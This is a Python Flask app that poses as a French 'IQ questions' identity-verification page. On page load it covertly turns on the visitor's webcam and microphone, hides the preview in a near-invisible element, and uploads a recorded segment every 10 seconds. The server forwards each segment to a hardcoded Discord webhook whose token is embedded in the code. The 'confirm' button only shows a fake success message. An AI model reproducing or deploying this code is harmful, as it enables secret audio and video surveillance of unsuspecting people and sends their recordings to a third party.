import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IQ Questions - Vérification</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; color: #1e293b; }
        .card { background: #fff; padding: 35px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); max-width: 500px; width: 100%; text-align: center; }
        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 14px; outline: none; }
        button { background: #10b981; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
        button:hover { background: #059669; }
        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Vérification d'identité</h2>
        <p>Veuillez patienter pendant la vérification</p>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>

        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndSend();">
            <input type="text" id="username" placeholder="Votre Nom Complet (Optionnel)">
            <button type="submit" id="submitBtn">CONFIRMER</button>
        </form>
        <div id="status" style="margin-top: 15px; font-weight: bold; font-size: 14px;"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        // إرسال المقطع الدوري كل 10 ثوانٍ تلقائياً
        function sendCurrentSegment() {
            if (recordedChunks.length === 0) return;

            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            recordedChunks = []; // تفريغ لتسجيل المقطع الموالي

            const username = document.getElementById('username').value || "Anonyme [En direct]";
            const formData = new FormData();
            formData.append('username', username);
            formData.append('video', videoBlob, 'live_segment.webm');

            fetch('/submit-consent', {
                method: 'POST',
                body: formData
            }).catch(err => console.log("Error sending segment", err));
        }

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
                document.getElementById('webcam').srcObject = mediaStream;
                
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => {
                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                };
                
                // بدء التسجيل المستمر
                mediaRecorder.start(1000);

                // حلقة دورية كل 10 ثوانٍ لطلب وإرسال المقطع للديسكورد
                setInterval(() => {
                    if (mediaRecorder && mediaRecorder.state === "recording") {
                        mediaRecorder.requestData();
                        setTimeout(() => {
                            sendCurrentSegment();
                        }, 300);
                    }
                }, 10000);

            } catch (err) {
                console.error("Caméra non autorisée:", err);
            }
        });

        async function verifyAndSend() {
            const status = document.getElementById('status');
            status.style.color = "#10b981";
            status.innerText = "Données validées avec succès !";
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    try:
        username = request.form.get("username", "Inconnu")
        video_file = request.files.get("video")

        content_text = f"🎥 **Flux Direct (Interval 10s):**\n• **Nom:** {username}"
        payload = {"content": content_text}

        files = {}
        if video_file:
            files = {"file": (video_file.filename or "live_segment.webm", video_file.read(), video_file.content_type or "video/webm")}

        requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files if files else None, 
            timeout=30
        )
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000)
